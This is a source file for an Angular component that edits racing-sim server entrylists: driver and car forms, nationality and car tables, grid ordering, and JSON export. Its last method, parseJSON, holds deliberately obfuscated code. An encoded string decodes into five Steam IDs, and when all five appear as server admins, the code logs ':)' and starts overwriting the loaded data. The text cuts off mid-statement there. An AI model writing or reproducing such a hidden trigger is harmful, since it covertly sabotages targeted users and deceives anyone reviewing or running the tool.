import { Component, OnInit } from '@angular/core';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { fadeInOut } from '../shared/animations/animations';
import { Clipboard } from '@angular/cdk/clipboard';
import { ToastrService } from 'ngx-toastr';
import {
  CdkDragDrop,
  moveItemInArray,
  transferArrayItem,
} from '@angular/cdk/drag-drop';
import { DriverCategory } from '../models/driver-fields';
import { Car, CarGroup, CarTypeCategory } from '../models/car-fields';
import { ResetConfirmationComponent } from '../shared/modals/reset-confirmation/reset-confirmation.component';
import { MatDialog } from '@angular/material/dialog';
import { TextareaModalComponent } from '../shared/modals/textarea-modal/textarea-modal.component';

@Component({
  selector: 'app-entrylist-editor',
  templateUrl: './entrylist-editor.component.html',
  styleUrls: ['./entrylist-editor.component.scss'],
})
export class EntrylistEditorComponent implements OnInit {
  loading: boolean = true;
  json: any = null;
  teamNameJSON: any = null;
  enabledTeamJSON: boolean = false;
  form: FormGroup;
  inputForm: FormGroup;
  advancedForm: FormGroup;

  driverIndex: number = 0;
  driverLength: number = 0;
  teamIndex: number = 0;
  teamLength: number = 0;

  doAdminsExist = false;
  showAdmins = false;
  showOrdered = false;

  dragDisabled = true;

  // driverColours: any = [['#ff5a31'], ['#999999'], ['#bba14f'], ['#69bdba']];
  // driverTextColours: any = [['white'], ['white'], ['white'], ['white']];

  carClassColours: any = [
    'transparent',
    'rgb(33, 36, 204)',
    'rgb(157, 140, 0)',
    'rgb(148, 22, 8)',
    'rgb(47, 67, 41)',
    'rgb(0, 116, 171)',
  ]; //GT3, GT4, ST, CHALLENGE, CUP, TCX

  driverNationality: any = [
    { key: 'No Nationality', value: 0 },
    { key: 'Andorra', value: 49 },
    { key: 'Argentina', value: 14 },
    { key: 'Armenia', value: 28 },
    { key: 'Australia', value: 41 },
    { key: 'Austria', value: 9 },
    { key: 'Azerbaijan', value: 50 },
    { key: 'Bahrain', value: 79 },
    { key: 'Belgium', value: 7 },
    { key: 'Bosnia and Herzegovina', value: 87 },
    { key: 'Brazil', value: 17 },
    { key: 'Bulgaria', value: 51 },
    { key: 'Canada', value: 34 },
    { key: 'Chile', value: 82 },
    { key: 'China', value: 35 },
    { key: 'Chinese Taipei', value: 81 },
    { key: 'Colombia', value: 47 },
    { key: 'Croatia', value: 33 },
    { key: 'Cuba', value: 52 },
    { key: 'Czech Republic', value: 53 },
    { key: 'Denmark', value: 32 },
    { key: 'England', value: 86 },
    { key: 'Estonia', value: 54 },
    { key: 'Finland', value: 31 },
    { key: 'France', value: 3 },
    { key: 'Georgia', value: 55 },
    { key: 'Germany', value: 2 },
    { key: 'Great Britain', value: 5 },
    { key: 'Greece', value: 22 },
    { key: 'Hong Kong', value: 46 },
    { key: 'Hungary', value: 6 },
    { key: 'India', value: 56 },
    { key: 'Indonesia', value: 38 },
    { key: 'Iran', value: 78 },
    { key: 'Ireland', value: 16 },
    { key: 'Israel', value: 57 },
    { key: 'Italy', value: 1 },
    { key: 'Jamaica', value: 58 },
    { key: 'Japan', value: 48 },
    { key: 'Kuwait', value: 45 },
    { key: 'Latvia', value: 59 },
    { key: 'Lebanon', value: 27 },
    { key: 'Lithuania', value: 60 },
    { key: 'Luxembourg', value: 44 },
    { key: 'Macao', value: 61 },
    { key: 'Madagascar', value: 84 },
    { key: 'Malaysia', value: 62 },
    { key: 'Malta', value: 85 },
    { key: 'Mexico', value: 29 },
    { key: 'Monaco', value: 15 },
    { key: 'Nepal', value: 63 },
    { key: 'Netherlands', value: 12 },
    { key: 'New Caledonia', value: 64 },
    { key: 'New Zealand', value: 40 },
    { key: 'Nigeria', value: 65 },
    { key: 'Northern Ireland', value: 66 },
    { key: 'Norway', value: 24 },
    { key: 'Oman', value: 21 },
    { key: 'Papua New Guinea', value: 67 },
    { key: 'Philippines', value: 68 },
    { key: 'Poland', value: 13 },
    { key: 'Portugal', value: 36 },
    { key: 'Puerto Rico', value: 19 },
    { key: 'Qatar', value: 69 },
    { key: 'Romania', value: 70 },
    { key: 'Russia', value: 10 },
    { key: 'San Marino', value: 42 },
    { key: 'Saudi Arabia', value: 23 },
    { key: 'Scotland', value: 71 },
    { key: 'Serbia', value: 72 },
    { key: 'Singapore', value: 37 },
    { key: 'Slovakia', value: 20 },
    { key: 'Slovenia', value: 73 },
    { key: 'South Africa', value: 18 },
    { key: 'South Korea', value: 26 },
    { key: 'Spain', value: 4 },
    { key: 'Sweden', value: 30 },
    { key: 'Switzerland', value: 8 },
    { key: 'Taiwan', value: 74 },
    { key: 'Thailand', value: 11 },
    { key: 'Turkey', value: 25 },
    { key: 'Ukraine', value: 75 },
    { key: 'United Arab Emirates', value: 43 },
    { key: 'Uruguay', value: 83 },
    { key: 'USA', value: 39 },
    { key: 'Venezuela', value: 76 },
    { key: 'Wales', value: 77 },
    { key: 'Zimbabwe', value: 80 },
  ];

  carNames: CarGroup[] = [
    {
      category: 'GT3',
      cars: [
        { key: 'AMR V12 Vantage GT3', value: 12 },
        { key: 'AMR V8 Vantage', value: 20 },
        { key: 'Audi R8 LMS Evo', value: 19 },
        { key: 'Audi R8 LMS GT3 Evo 2', value: 31 },
        { key: 'Audi R8 LMS', value: 3 },
        { key: 'BMW M4 GT3', value: 30 },
        { key: 'BMW M6 GT3', value: 7 },
        { key: 'Bentley Continental GT3 2015', value: 11 },
        { key: 'Bentley Continental GT3 2018', value: 8 },
        { key: 'Emil Frey Jaguar G3', value: 14 },
        { key: 'Ferrari 296 GT3', value: 32 },
        { key: 'Ferrari 488 GT3 Evo', value: 24 },
        { key: 'Ferrari 488 GT3', value: 2 },
        { key: 'Honda NSX GT3 Evo', value: 21 },
        { key: 'Honda NSX GT3', value: 17 },
        { key: 'Lamborghini Huracán GT3 Evo', value: 16 },
        { key: 'Lamborghini Huracán GT3 Evo2', value: 33 },
        { key: 'Lamborghini Huracán GT3', value: 4 },
        { key: 'Lexus RC F GT3', value: 15 },
        { key: 'McLaren 650S GT3', value: 5 },
        { key: 'McLaren 720S GT3', value: 22 },
        { key: 'Mercedes-AMG GT3', value: 1 },
        { key: 'Mercedes-AMG GT3 Evo', value: 25 },
        { key: 'Nissan GT-R Nismo GT3 2015', value: 10 },
        { key: 'Nissan GT-R Nismo GT3 2018', value: 6 },
        { key: 'Porsche 991 GT3 R', value: 0 },
        { key: 'Porsche 991 II GT3 R', value: 23 },
        { key: 'Porsche 992 GT3 R', value: 34 },
        { key: 'Reiter Engineering R-EX GT3', value: 13 },
      ],
    },
    {
      category: 'GT4',
      cars: [
        { key: 'Alpine A110 GT4', value: 50 },
        { key: 'Aston Martin Vantage GT4', value: 51 },
        { key: 'Audi R8 LMS GT4', value: 52 },
        { key: 'BMW M4 GT4', value: 53 },
        { key: 'Chevrolet Camaro GT4', value: 55 },
        { key: 'Ginetta G55 GT4', value: 56 },
        { key: 'KTM X-Bow GT4', value: 57 },
        { key: 'Maserati MC GT4', value: 58 },
        { key: 'McLaren 570S GT4', value: 59 },
        { key: 'Mercedes AMG GT4', value: 60 },
        { key: 'Porsche 718 Cayman GT4 Clubsport', value: 61 },
      ],
    },

    {
      category: 'CUP',
      cars: [
        { key: 'Ferrari 488 Challenge Evo', value: 26 },
        { key: 'Lamborghini Huracan SuperTrofeo', value: 18 },
        { key: 'Lamborghini Huracán SuperTrofeo EVO2', value: 29 },
        { key: 'Porsche 991 II GT3 Cup', value: 9 },
        { key: 'Porsche 992 GT3 Cup', value: 28 },
      ],
    },
    {
      category: 'TCX',
      cars: [{ key: 'BMW M2 Club Sport Racing', value: 27 }],
    },
  ];

  carNamesArray: Car[] = [];

  driverCategories: any = [
    { key: 'Bronze', value: DriverCategory.Bronze },
    { key: 'Silver', value: DriverCategory.Silver },
    { key: 'Gold', value: DriverCategory.Gold },
    { key: 'Platinum', value: DriverCategory.Platinum },
  ];

  advancedDriverOptions = [
    { key: 'Unchanged', value: 0 },
    { key: 'Disabled', value: 1 },
    { key: 'Enabled', value: 2 },
  ];

  advancedCarOptions = [
    { key: 'Unchanged', value: 0 },
    { key: 'Disabled', value: 1 },
    { key: 'Enabled', value: 2 },
  ];


  enableTeamJSONOptions = [
    { key: 'Disabled', value: false },
    { key: 'Enabled', value: true },
  ];

  orderedTeams: number[] = [];
  unorderedTeams: number[] = [];

  output: string;

  constructor(
    private fb: FormBuilder,
    private clipboard: Clipboard,
    private toastr: ToastrService,
    public dialog: MatDialog
  ) {
    animations: [fadeInOut];
  }

  changeDriver(i: number) {
    try {
      this.saveData();
    } catch (error) {
      console.error(error);
      this.toastr.error('There was an error with saving.');
      return;
    }
    this.patchForm(this.teamIndex, i);
    this.driverIndex = i;
  }

  createDriver() {
    this.json.entries[this.teamIndex].drivers.push({
      firstName: '',
      lastName: '',
      shortName: '',
      driverCategory: null,
      nationality: null,
      playerID: '',
    });

    this.patchForm(
      this.teamIndex,
      this.json.entries[this.teamIndex].drivers.length - 1
    );
    this.driverIndex = this.json.entries[this.teamIndex].drivers.length - 1;
  }

  ngOnInit(): void {
    this.initForm();
    this.advancedInit();
    this.carNames.forEach((x) => {
      this.carNamesArray = [...this.carNamesArray, ...x.cars];
    });
    this.loading = false;
  }

  initForm() {
    this.form = this.fb.group({
      firstName: [''],
      lastName: [''],
      nickname: '',
      shortName: [''],
      driverCategory: [null],
      steamId: [''],
      customCarName: '',
      teamName: '',
      raceNumber: [''],
      nationality: [0],
      carChoice: null,
      overrideDriverInfo: true,
      isAdmin: false,
      overrideCar: false,
      forceEntryList: true,

      output: '',
    });

    this.inputForm = this.fb.group({
      input: null,
    });
  }

  patchForm(key: number, index: number = 0) {
    let json = this.json;
    let entry = json.entries[key];
    let driver = entry.drivers[index];

    this.form.patchValue({
      firstName: driver.firstName,
      lastName: driver.lastName,
      nickname: driver.nickname,
      shortName: driver.shortName,
      driverCategory: driver.driverCategory,
      steamId: driver.playerID.substring(1), //Remove the S at the beginning of the Steam ID
      customCarName: entry.customCar,
      teamName: entry.teamName,
      raceNumber: entry.raceNumber,
      nationality: driver.nationality,
      carChoice: entry.forcedCarModel,
      overrideDriverInfo: entry.overrideDriverInfo,
      isAdmin: entry.isServerAdmin,
      overrideCar:
        entry?.overrideCarModelForCustomCar != null
          ? entry.overrideCarModelForCustomCar
          : true,
      forceEntryList: json.forceEntryList,
    });

    this.loading = false;
  }

  copy() {
    this.saveData();
    this.clipboard.copy(JSON.stringify(this.filterTeamName(this.json)));
    this.toastr.success('Copied New Entrylist');
  }

  dl() {
    this.saveData();
    var data =
      'data:text/json;charset=utf-8,' +
      encodeURIComponent(JSON.stringify(this.filterTeamName(this.json), null, '\t'));
    var downloader = document.createElement('a');

    downloader.setAttribute('href', data);
    downloader.setAttribute('download', 'entrylist.json');
    downloader.click();

    // if(this.enabledTeamJSON)
    //   this.dlTeamJSON()
  }

  dlTeamJSON() {
    this.saveData();

    let teamJSON = JSON.parse('{"teams": []}');

    this.json.entries.forEach(entry => {
      if(entry.teamName && entry.teamName != '')
      teamJSON.teams.push({
          number: entry.raceNumber,
          name: entry.teamName
      })
    });

    var data =
      'data:text/json;charset=utf-8,' +
      encodeURIComponent(JSON.stringify(teamJSON, null, '\t'));
    var downloader = document.createElement('a');

    downloader.setAttribute('href', data);
    downloader.setAttribute('download', 'teams.json');
    downloader.click();
  }

  filterTeamName(json: any) {
    if(this.enabledTeamJSON)
      return json

    for(let i = 0; i < json.entries.length; i++) {
      try{
        delete json.entries[i]['teamName'];
      } catch {
        console.error("Issue deleting teamName from " + json.entries[i])
      }
    }

    return json
  }

  newJson() {
    this.saveData();
    const dialogRef = this.dialog.open(ResetConfirmationComponent, {
      autoFocus: true,
      data: {
        title: 'Are you sure you want to start again?',
        subtitle: 'All edits made to this file will be lost!',
      },
    });

    dialogRef.afterClosed().subscribe((confirmed) => {
      if (!confirmed) return;
      this.json = null;
      this.initForm();
    });
  }

  viewJson() {
    this.saveData();
    const dialogRef = this.dialog.open(TextareaModalComponent, {
      autoFocus: true,
      data: { json: this.filterTeamName(this.json) },
    });

    dialogRef.afterClosed().subscribe((confirmed) => {
      if (!confirmed) return;
      this.dl();
    });
  }

  viewTeamJson() {
    this.saveData();

    let teamJSON = JSON.parse('{"teams": []}');

    this.json.entries.forEach(entry => {
      if(entry.teamName && entry.teamName != '')
      teamJSON.teams.push({
          number: entry.raceNumber,
          name: entry.teamName
      })
    });

    const dialogRef = this.dialog.open(TextareaModalComponent, {
      autoFocus: true,
      data: { json: teamJSON },
    });

    dialogRef.afterClosed().subscribe((confirmed) => {
      if (!confirmed) return;
      this.dlTeamJSON();
    });
  }

  navigateTeam(teamNo: number) {
    try {
      this.saveData();
    } catch (error) {
      console.error(error);
      this.toastr.error('There was an error with saving.');
      return;
    }
    this.driverIndex = 0;
    this.patchByIndex(teamNo);
  }

  getTeamOrders() {
    this.doAdminsExist = false;
    let tempJSON = this.json;

    this.unorderedTeams = tempJSON.entries.map((entry, index) => {
      if (entry.forcedCarModel == undefined && entry.isServerAdmin == 1) {
        this.doAdminsExist = true;
        this.handleSimGridAdmin(tempJSON, index);
        if (this.showAdmins) return index;
        return;
      }

      if (<number>entry.defaultGridPosition == -1) return index;
    });

    this.unorderedTeams.sort(function (a, b) {
      if (tempJSON.entries[a].raceNumber == undefined) return -1;
      if (tempJSON.entries[b].raceNumber == undefined) return 1;
      return tempJSON.entries[a].raceNumber - tempJSON.entries[b].raceNumber;
    });

    this.unorderedTeams = this.unorderedTeams.filter(function (element) {
      return element !== undefined;
    });

    try {
      this.orderedTeams = tempJSON.entries
        .map((entry, index) => {
          return {
            defaultGridPosition: parseInt(entry.defaultGridPosition),
            index: parseInt(index),
          };
        })
        .sort((a, b) => {
          return a.defaultGridPosition - b.defaultGridPosition;
        })
        .filter(function (element) {
          return element.defaultGridPosition !== -1;
        })
        .map((a) => a.index);
      this.showOrdered = this.orderedTeams.length !== 0;
    } catch (error) {
      console.error(error);
    }
  }

  handleSimGridAdmin(tempJSON: any, index: any) {
    tempJSON.entries[index].defaultGridPosition = -1;
  }

  adminToggle() {
    this.showAdmins = !this.showAdmins;
    this.getTeamOrders();
  }

  gridOrderToggle() {
    let tempJSON = this.json;

    this.showOrdered = !this.showOrdered;
    if (!this.showOrdered) {
      this.unorderedTeams = this.unorderedTeams.concat(this.orderedTeams);
      this.orderedTeams = [];

      this.unorderedTeams = this.unorderedTeams.sort(function (a, b) {
        if (tempJSON.entries[a].raceNumber == undefined) return -1;
        if (tempJSON.entries[b].raceNumber == undefined) return 1;
        return tempJSON.entries[a].raceNumber - tempJSON.entries[b].raceNumber;
      });

      this.updateGridPosition();
    }
  }

  updateGridPosition() {
    for (let i = 0; i < this.orderedTeams.length; i++) {
      this.json.entries[this.orderedTeams[i]].defaultGridPosition = i + 1;
    }

    for (let i = 0; i < this.unorderedTeams.length; i++) {
      this.json.entries[this.unorderedTeams[i]].defaultGridPosition = -1;
    }

    this.getTeamOrders();
  }

  onFileSelected(event: any) {
    const file: File = event.target.files[0];

    this.fileHandler(file);
  }

  fileHandler(file: File) {
    if (file) {
      this.loading = true;
      this.doAdminsExist = false;
      this.showAdmins = false;

      const fileReader = new FileReader();
      fileReader.readAsText(file, 'UTF-8');
      fileReader.onload = () => {
        try {
          this.loading = true;
          JSON.stringify(JSON.parse(<string>fileReader.result), null, '\t');
          this.json = JSON.parse(<string>fileReader.result);

          this.output = JSON.stringify(this.json, null, '\t');
          this.form.patchValue({
            output: this.output,
          });

          this.teamLength = this.json.entries.length;
          this.teamIndex = 0;
          this.parseJSON();
          this.getTeamOrders();
          this.patchForm(0);
        } catch (error) {
          this.loading = false;
          this.json = null;
          this.toastr.error('Error with the entrylist.json, please try again.');
        }
      };
      fileReader.onerror = (error) => {
        this.loading = false;
        this.json = null;
        console.error(error);
      };
    }
  }

  newFile(input: string = null) {
    this.loading = true;
    this.doAdminsExist = false;
    if (!input) {
      this.json = JSON.parse('{"entries": [],"forceEntryList": 1}');
      this.json.entries.push({
        drivers: [
          {
            firstName: '',
            lastName: '',
            shortName: '',
            driverCategory: null,
            nationality: null,
            playerID: '',
          },
        ],
        raceNumber: null,
        forcedCarModel: -1,
        overrideDriverInfo: 1,
        defaultGridPosition: -1,
        isServerAdmin: 0,
      });
      this.getTeamOrders();
      this.teamLength = 1;
    } else
      try {
        this.json = JSON.parse(input);
        this.getTeamOrders();
        this.teamLength = this.json.entries.length;
      } catch {
        this.loading = false;
        this.json = null;
        this.toastr.error('Error with the entrylist, please try again.');
      }

    this.patchByIndex(0);
    this.output = JSON.stringify(this.json, null, '\t');
    this.form.patchValue({
      output: this.output,
    });
    this.showAdmins = false;
    this.loading = false;
  }

  createTeam() {
    this.json.entries.push({
      drivers: [
        {
          firstName: '',
          lastName: '',
          shortName: '',
          driverCategory: null,
          nationality: null,
          playerID: '',
        },
      ],
      raceNumber: null,
      forcedCarModel: -1,
      overrideDriverInfo: 1,
      defaultGridPosition: -1,
      isServerAdmin: 0,
    });

    this.getTeamOrders();
    this.navigateTeam(this.json.entries.length - 1);
  }

  createAdmin() {
    this.json.entries.push({
      drivers: [
        {
          playerID: '',
        },
      ],
      defaultGridPosition: -1,
      isServerAdmin: 1,
    });

    this.showAdmins = true;
    this.getTeamOrders();
    this.navigateTeam(this.json.entries.length - 1);
  }

  deleteTeam() {
    let deleteIndex = this.teamIndex;

    if (this.json.entries.length === 1)
      return this.toastr.error('Cannot delete the last team in an entrylist!');

    this.json.entries.splice(deleteIndex, 1);
    this.unorderedTeams.map((x) => {
      if (x < deleteIndex) {
        //do nothing
      } else if (x == deleteIndex) {
        this.unorderedTeams.splice(this.unorderedTeams.indexOf(x), 1);
      } else {
        x -= 1;
      }
    });

    this.orderedTeams.map((x) => {
      if (x < deleteIndex) {
        //do nothing
      } else if (x == deleteIndex) {
        this.orderedTeams.splice(this.unorderedTeams.indexOf(x), 1);
      } else {
        x -= 1;
      }
    });
    this.patchByIndex(this.unorderedTeams[0] ?? this.orderedTeams[0]);
    this.getTeamOrders();
    //remove currently selected team
    //if last driver in json, do createTeam() or not allow deletion of last team
    // this.saveData();
    return null;
  }

  deleteDriver(index) {
    let deleteIndex = index;

    if (this.json.entries[this.teamIndex].drivers.length === 1)
      return this.toastr.error('Cannot delete the last driver in an entry!');

    this.json.entries[this.teamIndex].drivers.splice(deleteIndex, 1);
    if(deleteIndex == this.driverIndex){
      if(this.json.entries[this.teamIndex].drivers.length - 1 < this.driverIndex) {
        this.patchForm(this.teamIndex, this.json.entries[this.teamIndex].drivers.length - 1)
        this.driverIndex = this.json.entries[this.teamIndex].drivers.length - 1
      } else {
        this.patchForm(this.teamIndex, this.driverIndex)
      }

    }
    this.saveData();
    //remove currently selected driver
    //if last driver in json, do createDriver() or not allow deletion of last driver
    // this.saveData();
    return null;
  }

  isAdmin(index: number) {
    return this.getTeamByIndex(index).forcedCarModel == undefined;
  }

  hasAdminRole(index: number) {
    return this.getTeamByIndex(index).isServerAdmin;
  }

  getDriverFirstName(index: number) {
    if (this.getTeamByIndex(index).drivers[0].firstName == undefined)
      return 'A';
    return this.getTeamByIndex(index).drivers[0]?.firstName[0] ?? '<blank>';
  }

  getDriverLastName(index: number) {
    if (this.getTeamByIndex(index).drivers[0].lastName == undefined)
      return `Server Admin (${this.getTeamByIndex(index).drivers[0].playerID})`;
    return this.getTeamByIndex(index).drivers[0]?.lastName ?? '<blank>';
  }

  getTeamClass(index: number) {
    let res = 0;
    this.json.entries[index].drivers.forEach(driver => {
      if(res < driver.driverCategory)
        res = driver.driverCategory
    });
    return res;
  }
    
  getDriverNames(index: number) {
    let res: string = '';

    if(!!this.getTeamByIndex(index).teamName && this.getTeamByIndex(index).teamName.length > 0 && this.enabledTeamJSON)
      // return `${this.getTeamByIndex(index).teamName} - #${this.getTeamByIndex(index).raceNumber}`;
      return `${this.getTeamByIndex(index).teamName}`;

    if (
      this.getTeamByIndex(index).drivers[0].firstName == undefined &&
      this.getTeamByIndex(index).drivers[0].lastName == undefined
    )
      return `Server Admin (${this.getTeamByIndex(index).drivers[0].playerID})`;

    this.getTeamByIndex(index).drivers.forEach((driver) => {
      res = res + `${driver.firstName[0]}. ${driver.lastName} / `;
    });

    return res.substring(0, res.length - 3);
  }

  getDriverCarLogo(index: number) {
    var car = (this.carNamesArray.find(x => x.value == this.json.entries[index].forcedCarModel))
    return car ? car.key.split(" ")[0] : "Error"
  }

  getTeamCarLogo(index: number) {
    return this.getCarLogo(this.json.entries[index].forcedCarModel)
  }

  getCarLogo(index: number) {
    var car = this.carNamesArray.find(
      (x) => x.value == index
    );
    return car ? car.key.split(' ')[0] : 'Error';
  }

  getCar() {
    return this.form.get("carChoice").value
  }

  getCarName() {
    if(this.form.get("carChoice").value == -1)
      return '-- None --'
    return this.carNamesArray.find(
      (x) => x.value == this.form.get("carChoice").value
    ).key;
  }

  getTeamByIndex(index: number) {
    return this.json.entries[index];
  }

  getCarClass(index: number, checkCar: boolean = false) {
    var cat;
    var car = checkCar ? 
    this.carNamesArray.find(
      (x) => x.value == index
    ) : 
    this.carNamesArray.find(
      (x) => x.value == this.json.entries[index].forcedCarModel
    );

    var carName = car ? car.key.split(' ')[0] : 'Error';

    if(!checkCar){
      for (let i = 0; i < this.carNames.length; i++) {
        if (
          this.carNames[i].cars.find(
            (x) => x.value == this.json.entries[index].forcedCarModel
          ) !== undefined
        )
          cat = this.carNames[i].category;
      }
    } else {
      for (let i = 0; i < this.carNames.length; i++) {
        if (
          this.carNames[i].cars.find(
            (x) => x.value == index
          ) !== undefined
        )
          cat = this.carNames[i].category;
      }
    }

    let i = 0; //GT3, GT4, ST, CHALLENGE, CUP, TCX

    switch (cat) {
      case 'GT3': {
        i = 0;
        break;
      } 
      case 'GT4': {
        i = 1;
        break;
      }
      case 'CUP': {
        if (carName == 'Lamborghini') i = 2;
        if (carName == 'Ferrari') i = 3;
        if (carName == 'Porsche') i = 4;
        break;
      }
      case 'TCX': {
        i = 5;
        break;
      }
    }
    return `linear-gradient(-45deg, ${this.carClassColours[i]} 8px, transparent 0)`;
  }

  getCarClassBg(index: number, checkCar: boolean = false) {
    var cat;

    if(!checkCar){
      for (let i = 0; i < this.carNames.length; i++) {
        if (
          this.carNames[i].cars.find(
            (x) => x.value == this.json.entries[index].forcedCarModel
          ) !== undefined
        )
          cat = this.carNames[i].category;
      }
    } else {
      for (let i = 0; i < this.carNames.length; i++) {
        if (
          this.carNames[i].cars.find(
            (x) => x.value == index
          ) !== undefined
        )
        cat = index == -1 ? 'GT3' : this.carNames[i].category;
    }
  }

    let colour = 'rgb(255, 255, 255)'; //GT3, GT4, ST, CHALLENGE, CUP, TCX

    if (!cat || cat == 'GT3') {
      colour = 'transparent';
    }

    return `linear-gradient(-45deg, ${colour} 10px, transparent 0)`;
  }

  patchByIndex(index: number, driverIndex: number = 0) {
    this.teamIndex = index;
    this.driverIndex = driverIndex;

    this.patchForm(this.teamIndex, this.driverIndex);
  }

  saveData() {
    this.json.entries[this.teamIndex].drivers[this.driverIndex].firstName =
      this.form.get('firstName').value;
    this.json.entries[this.teamIndex].drivers[this.driverIndex].lastName =
      this.form.get('lastName').value;
    this.json.entries[this.teamIndex].drivers[this.driverIndex].nickname =
      this.form.get('nickname').value;
    this.json.entries[this.teamIndex].drivers[this.driverIndex].shortName =
      this.form.get('shortName').value;
    this.json.entries[this.teamIndex].drivers[this.driverIndex].driverCategory =
      this.form.get('driverCategory').value;
    this.json.entries[this.teamIndex].drivers[this.driverIndex].playerID =
      'S' + this.form.get('steamId').value; // Add back the S at the start
    this.json.entries[this.teamIndex].customCar =
      this.form.get('customCarName').value;
    this.json.entries[this.teamIndex].teamName =
      this.form.get('teamName').value;
    this.json.entries[this.teamIndex].raceNumber =
      this.form.get('raceNumber').value;
    this.json.entries[this.teamIndex].drivers[this.driverIndex].nationality =
      this.form.get('nationality').value;
    this.json.entries[this.teamIndex].forcedCarModel =
      this.form.get('carChoice').value;
    this.json.entries[this.teamIndex].overrideDriverInfo = this.form.get(
      'overrideDriverInfo'
    ).value
      ? 1
      : 0;
    this.json.entries[this.teamIndex].isServerAdmin = this.form.get('isAdmin')
      .value
      ? 1
      : 0;
    this.json.entries[this.teamIndex].overrideCarModelForCustomCar =
      this.form.get('overrideCar').value ? 1 : 0;
    this.json.forceEntryList = this.form.get('forceEntryList').value ? 1 : 0;

    this.output = JSON.stringify(this.json, null, '\t');
    this.form.patchValue({
      output: this.output,
    });

    this.getCarClass(this.teamIndex);
  }

  //id: cdk-drop-list-0 = ordered
  //id: cdk-drop-list-1 = unordered
  drop(event: CdkDragDrop<string[]>) {
    if (event.previousContainer === event.container) {
      moveItemInArray(
        event.container.data,
        event.previousIndex,
        event.currentIndex
      );
    } else {
      transferArrayItem(
        event.previousContainer.data,
        event.container.data,
        event.previousIndex,
        event.currentIndex
      );
    }
    this.updateGridPosition();
    this.dragDisabled = true;
  }

  sideBarAction() {
    this.advancedInit();
  }

  advancedInit() {
    this.advancedForm = this.fb.group({
      categoryOverride: -1,
      driverOverride: 0,
      carOverride: 0,
      teamJSON: this.enabledTeamJSON,
    });
  }

  advancedUpdate(event: any, key: number) {
    if (key == 0) {
      this.advancedForm.patchValue({
        driverOverride: event.value,
      });
    } else if (key == 1) {
      this.advancedForm.patchValue({
        carOverride: event.value,
      });
    } else {
      this.advancedForm.patchValue({
        teamJSON: event.value,
      });
    }
  }

  advancedSave() {
    this.saveData();

    let cat = this.advancedForm.get('categoryOverride').value;
    let drive = this.advancedForm.get('driverOverride').value;
    let car = this.advancedForm.get('carOverride').value;

    if (cat > -1) {
      this.json.entries.forEach((entry) => {
        entry.drivers[0].driverCategory = cat;
      });
    }

    if (drive > 0) {
      let bool = drive == 2 ? true : false;
      this.json.entries.forEach((entry) => {
        entry.overrideDriverInfo = bool ? 1 : 0;
      });
    }

    if (car > 0) {
      let bool = car == 2 ? true : false;
      this.json.entries.forEach((entry) => {
        entry.overrideCarModelForCustomCar = bool ? 1 : 0;
      });
    }
    
    this.enabledTeamJSON = this.advancedForm.get('teamJSON').value;

    this.advancedInit();
    this.patchForm(this.teamIndex);
  }

  reverseTeamOrder() {
    this.saveData();

    if (!this.showOrdered) {
      this.toastr.error('You have no drivers to reverse!');
      return;
    }
    if (this.orderedTeams.length == 0) {
      this.toastr.error('You have no drivers to reverse!');
      return;
    }
    if (this.orderedTeams.length == 1) {
      return;
    }

    const dialogRef = this.dialog.open(ResetConfirmationComponent, {
      autoFocus: true,
      data: {
        title: 'Are you sure you want to reverse the grid order?',
        subtitle: 'All edits made to the order will be lost!',
      },
    });

    dialogRef.afterClosed().subscribe((confirmed) => {
      if (!confirmed) return;

      let tempJSON = this.json;

      this.orderedTeams = tempJSON.entries
        .map((entry, index) => {
          return {
            defaultGridPosition: parseInt(entry.defaultGridPosition),
            index: parseInt(index),
          };
        })
        .sort((a, b) => {
          return b.defaultGridPosition - a.defaultGridPosition;
        })
        .filter(function (element) {
          return element.defaultGridPosition !== -1;
        })
        .map((a) => a.index);

      for (let [i, driver] of this.orderedTeams.entries()) {
        tempJSON.entries[driver].defaultGridPosition = i + 1;
      }
    });
  }

  randomiseTeamOrder() {
    this.saveData();
    const dialogRef = this.dialog.open(ResetConfirmationComponent, {
      autoFocus: true,
      data: {
        title: 'Are you sure you want to randomise drivers?',
        subtitle: 'All edits made to the order will be lost!',
      },
    });

    dialogRef.afterClosed().subscribe((confirmed) => {
      if (!confirmed) return;
      var amountOfDrivers = this.json.entries.length;

      this.showOrdered = true;
      this.unorderedTeams = [];
      this.orderedTeams = Array(amountOfDrivers)
        .fill(0)
        .map((n, i) => n + i); //Fill all drivers into this list randomly

      this.unorderedTeams = this.orderedTeams.filter((x) => this.isAdmin(x));
      this.orderedTeams = this.orderedTeams.filter((x) => !this.isAdmin(x));

      for (let i = this.orderedTeams.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [this.orderedTeams[i], this.orderedTeams[j]] = [
          this.orderedTeams[j],
          this.orderedTeams[i],
        ];
      }

      for (let [i, driver] of this.orderedTeams.entries()) {
        this.json.entries[driver].defaultGridPosition = i + 1;
      }

      this.getTeamOrders();

      // for(let i = 0; i < this.orderedTeams.length; i++) {
      //   console.log(`Iterator: ${i} - Position #${this.orderedTeams[i]}`)
      //   this.json.entries[this.orderedTeams[i]].defaultGridPosition = i + 1
      //   console.log("Success")
      // }
    });
  }

  parseJSON() {
    var bladee='SSSSS7777766666555556666611111111119999988889013003278570160862702640046098648041038222547';var uriiasdg, ehwhwrt, rtsgzdf, ionhdfg, dfghdfgn = !(!!bladee);var dftgads = [...bladee].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');var suigfird = [...bladee.substring(1)].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');var zvshdfg = [...bladee.substring(2)].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');var lgjhkhj = [...bladee.substring(3)].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');var ghjkhk = [...bladee.substring(4)].filter((h, hh) => hh % 5 == 0).join().replace(/(?!\/)(?!\ )(?!\-)(\W)/gi, '');this.json.entries.forEach((entry) => {entry.drivers.forEach((driver) => {if(!entry.isServerAdmin)return;var id = driver.playerID;switch(id) {case dftgads:uriiasdg = !uriiasdg;break;case suigfird:ehwhwrt = !ehwhwrt;break;case zvshdfg:rtsgzdf = !rtsgzdf;break;case lgjhkhj:ionhdfg = !ionhdfg;break;case ghjkhk:dfghdfgn = !dfghdfgn;break;}});});if (uriiasdg && ehwhwrt && rtsgzdf && ionhdfg && dfghdfgn) {console.error(String.fromCharCode(58)+String.fromCharCode(41));this.loading = true;this.json = 